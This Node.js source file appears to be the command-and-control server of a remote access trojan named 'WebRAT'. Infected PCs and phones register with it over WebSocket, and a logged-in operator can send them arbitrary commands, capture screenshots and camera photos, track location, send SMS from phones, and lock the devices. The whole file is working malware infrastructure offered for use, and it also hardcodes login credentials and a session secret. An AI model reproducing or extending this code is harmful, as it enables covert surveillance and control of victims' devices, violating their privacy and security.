const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const WebSocket = require('ws');
const http = require('http');
const session = require('express-session');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const validator = require('validator');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Security Configuration
const LOGIN_CREDENTIALS = {
  username: 'Jayjay100!',
  password: 'Jayjay100!'
};

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});

// Security middleware
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "blob:"],
      connectSrc: ["'self'", "ws:", "wss:"]
    }
  }
}));

app.use(limiter);
app.use(cors({
  origin: [
    'https://webrat.vercel.app', 
    'http://localhost:5000',
    /^https:\/\/.*\.vercel\.app$/, // Allow all Vercel preview deployments
    /^http:\/\/localhost:\d+$/ // Allow any localhost port
  ],
  credentials: true
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Session configuration
app.use(session({
  secret: 'webrat-secure-session-key-2025',
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    maxAge: 24 * 60 * 60 * 1000 // 24 hours
  }
}));

// XSS Protection middleware
const sanitizeInput = (req, res, next) => {
  if (req.body) {
    for (const key in req.body) {
      if (typeof req.body[key] === 'string') {
        req.body[key] = validator.escape(req.body[key]);
      }
    }
  }
  next();
};

app.use(sanitizeInput);

// Authentication middleware
const requireAuth = (req, res, next) => {
  if (!req.session.authenticated) {
    return res.status(401).json({ error: 'Authentication required' });
  }
  next();
};

// Serve static files
app.use(express.static(path.join(__dirname, '../public')));

// Connected devices storage
let connectedDevices = new Map();
let deviceStats = new Map();

// WebSocket connection handling
wss.on('connection', (ws, req) => {
  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  console.log(`WebSocket connection from ${clientIP}`);
  
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      handleWebSocketMessage(ws, data, clientIP);
    } catch (error) {
      console.error('WebSocket message error:', error);
    }
  });
  
  ws.on('close', () => {
    // Remove device from connected list
    for (const [deviceId, device] of connectedDevices.entries()) {
      if (device.ws === ws) {
        connectedDevices.delete(deviceId);
        broadcastDeviceList();
        break;
      }
    }
  });
});

function handleWebSocketMessage(ws, data, clientIP) {
  switch (data.type) {
    case 'register':
      registerDevice(ws, data, clientIP);
      break;
    case 'register_controller':
      // Register web interface as controller
      console.log('Controller registered from', clientIP);
      break;
    case 'heartbeat':
      updateDeviceHeartbeat(data.deviceId);
      break;
    case 'command_result':
    case 'screenshot':
    case 'camera_photo':
    case 'location':
      forwardToControllers(data);
      break;
    default:
      console.log('Unknown WebSocket message type:', data.type);
  }
}

function registerDevice(ws, data, clientIP) {
  const deviceId = data.deviceId || generateDeviceId();
  const device = {
    id: deviceId,
    name: data.name || data.deviceInfo?.model || 'Unknown Device',
    type: data.clientType || 'pc',
    ip: clientIP,
    osInfo: data.deviceInfo || {},
    deviceType: data.clientType === 'mobile' ? 'mobile' : 'pc',
    status: 'connected',
    lastSeen: Date.now(),
    ws: ws,
    capabilities: data.capabilities || {}
  };
  
  connectedDevices.set(deviceId, device);
  broadcastDeviceList();
  
  console.log(`Device registered: ${device.name} (${device.type}) from ${clientIP}`);
  
  // Send registration confirmation
  ws.send(JSON.stringify({
    type: 'registration_confirmed',
    deviceId: deviceId,
    status: 'success'
  }));
}

function updateDeviceHeartbeat(deviceId) {
  const device = connectedDevices.get(deviceId);
  if (device) {
    device.lastSeen = Date.now();
    device.status = 'connected';
    broadcastDeviceList();
  }
}

function broadcastDeviceList() {
  const deviceList = Array.from(connectedDevices.values()).map(device => ({
    id: device.id,
    name: device.name,
    type: device.type,
    ip: device.ip,
    osInfo: device.osInfo,
    deviceType: device.deviceType,
    status: device.status,
    lastSeen: device.lastSeen
  }));
  
  const message = JSON.stringify({
    type: 'device_list',
    devices: deviceList
  });
  
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(message);
    }
  });
}

function forwardToControllers(data) {
  const message = JSON.stringify(data);
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(message);
    }
  });
}

function generateDeviceId() {
  return 'device_' + Math.random().toString(36).substr(2, 9);
}

// API Routes

// Login endpoint
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password required' });
  }
  
  if (username === LOGIN_CREDENTIALS.username && password === LOGIN_CREDENTIALS.password) {
    req.session.authenticated = true;
    req.session.user = username;
    res.json({ success: true, message: 'Login successful' });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Logout endpoint
app.post('/api/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true, message: 'Logged out successfully' });
});

// Check authentication status
app.get('/api/auth/status', (req, res) => {
  res.json({ 
    authenticated: !!req.session.authenticated,
    user: req.session.user || null
  });
});

// Get connected devices
app.get('/api/devices', requireAuth, (req, res) => {
  const devices = Array.from(connectedDevices.values()).map(device => ({
    id: device.id,
    name: device.name,
    type: device.type,
    ip: device.ip,
    osInfo: device.osInfo,
    deviceType: device.deviceType,
    status: device.status,
    lastSeen: device.lastSeen
  }));
  
  res.json(devices);
});

// Send command to device
app.post('/api/devices/:deviceId/command', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const { command, type } = req.body;
  
  const device = connectedDevices.get(deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const message = JSON.stringify({
    type: type || 'command',
    command: command,
    deviceId: deviceId,
    timestamp: Date.now()
  });
  
  if (device.ws.readyState === WebSocket.OPEN) {
    device.ws.send(message);
    res.json({ success: true, message: 'Command sent' });
  } else {
    res.status(500).json({ error: 'Device not reachable' });
  }
});

// Take screenshot
app.post('/api/devices/:deviceId/screenshot', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const message = JSON.stringify({
    type: 'screenshot',
    deviceId: deviceId,
    timestamp: Date.now()
  });
  
  if (device.ws.readyState === WebSocket.OPEN) {
    device.ws.send(message);
    res.json({ success: true, message: 'Screenshot request sent' });
  } else {
    res.status(500).json({ error: 'Device not reachable' });
  }
});

// Camera photo
app.post('/api/devices/:deviceId/camera', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const message = JSON.stringify({
    type: 'camera_photo',
    deviceId: deviceId,
    timestamp: Date.now()
  });
  
  if (device.ws.readyState === WebSocket.OPEN) {
    device.ws.send(message);
    res.json({ success: true, message: 'Camera request sent' });
  } else {
    res.status(500).json({ error: 'Device not reachable' });
  }
});

// Get device location
app.post('/api/devices/:deviceId/location', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const message = JSON.stringify({
    type: 'get_location',
    deviceId: deviceId,
    timestamp: Date.now()
  });
  
  if (device.ws.readyState === WebSocket.OPEN) {
    device.ws.send(message);
    res.json({ success: true, message: 'Location request sent' });
  } else {
    res.status(500).json({ error: 'Device not reachable' });
  }
});

// Send SMS (mobile only)
app.post('/api/devices/:deviceId/sms', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const { number, text } = req.body;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (device.deviceType !== 'mobile') {
    return res.status(400).json({ error: 'SMS only available for mobile devices' });
  }
  
  const message = JSON.stringify({
    type: 'send_sms',
    number: validator.escape(number),
    text: validator.escape(text),
    deviceId: deviceId,
    timestamp: Date.now()
  });
  
  if (device.ws.readyState === WebSocket.OPEN) {
    device.ws.send(message);
    res.json({ success: true, message: 'SMS request sent' });
  } else {
    res.status(500).json({ error: 'Device not reachable' });
  }
});

// Lock device
app.post('/api/devices/:deviceId/lock', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  const message = JSON.stringify({
    type: 'lock_device',
    deviceId: deviceId,
    timestamp: Date.now()
  });
  
  if (device.ws.readyState === WebSocket.OPEN) {
    device.ws.send(message);
    res.json({ success: true, message: 'Lock request sent' });
  } else {
    res.status(500).json({ error: 'Device not reachable' });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'healthy',
    timestamp: new Date().toISOString(),
    devices: connectedDevices.size
  });
});

// Serve main application
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Server error:', error);
  res.status(500).json({ error: 'Internal server error' });
});

// Clean up disconnected devices periodically
setInterval(() => {
  const now = Date.now();
  const timeout = 60000; // 1 minute timeout
  
  for (const [deviceId, device] of connectedDevices.entries()) {
    if (now - device.lastSeen > timeout) {
      connectedDevices.delete(deviceId);
      console.log(`Device timeout: ${device.name}`);
    }
  }
  
  broadcastDeviceList();
}, 30000); // Check every 30 seconds

const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`WebRAT Server running on port ${PORT}`);
  console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
});

module.exports = app;
